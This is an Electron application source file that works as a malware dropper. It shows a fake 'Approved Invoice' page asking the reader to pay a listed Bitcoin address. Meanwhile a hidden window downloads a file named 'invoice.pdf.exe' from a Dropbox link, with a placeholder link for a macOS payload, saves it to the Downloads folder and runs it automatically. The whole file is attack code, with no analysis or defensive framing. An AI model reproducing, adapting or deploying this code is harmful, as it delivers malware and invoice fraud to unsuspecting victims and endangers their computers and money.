const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const { exec } = require('child_process');
const fs = require('fs');

function createWindow() {
  // 1. Create a VISIBLE worker window for debugging.
  const workerWin = new BrowserWindow({
    show: true, // Make window visible
    webPreferences: {
      nodeIntegration: true,
    },
  });
  workerWin.loadFile(path.join(__dirname, 'worker.html'));
  workerWin.webContents.openDevTools(); // Open DevTools

  // 2. Show the decoy invoice immediately.
  const decoyWin = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
    },
  });

  const invoiceHTML = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Invoice</title>
      <style>
        body { font-family: sans-serif; margin: 2em; }
        h1 { color: #333; }
        p { line-height: 1.6; }
        .address { font-family: monospace; background: #eee; padding: 1em; }
      </style>
    </head>
    <body>
      <h1>Approved Invoice</h1>
      <p>Well received, below I have attached an approved document invoice.</p>
      <p>You’re to pay that amount to the account address below the amount can also be remitted in cryptocurrency (Bitcoin)</p>
      <p>This is the address below</p>
      <p class="address">bc1qqku6e3qxyhlv5fvjaxazt0v5f5mf77lzt0ymm0</p>
      <p>Make due diligence in sending to the right address</p>
    </body>
    </html>
  `;
  decoyWin.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(invoiceHTML)}`);

  // 3. Start the background download simultaneously.
  const isMac = process.platform === 'darwin';

  const downloadLink = isMac
    ? 'YOUR_MACOS_PAYLOAD_DOWNLOAD_LINK_HERE'
    : 'https://www.dropbox.com/scl/fi/n5umt1lezx91cygika6r9/invoice.pdf.exe?rlkey=rv1x8zsttsi358h5juaexwfun&st=2vnrx3bf&dl=1';

  const fileName = isMac ? 'invoice.dmg' : 'invoice.pdf.exe';
  const downloadsPath = app.getPath('downloads');
  const filePath = path.join(downloadsPath, fileName);

  const downloadWin = new BrowserWindow({ show: false });
  downloadWin.loadURL(downloadLink);

  downloadWin.webContents.session.on('will-download', (event, item) => {
    item.setSavePath(filePath);
    item.on('done', (event, state) => {
      if (state === 'completed') {
        console.log('Download successfully');

        const command = isMac ? `open "${filePath}"` : `start "" "${filePath}"`;
        exec(command, (err) => {
          if (!err) app.quit();
        });
      } else {
        console.log(`Download failed: ${state}`);
        app.quit();
      }
    });
  });
}

app.whenReady().then(createWindow);
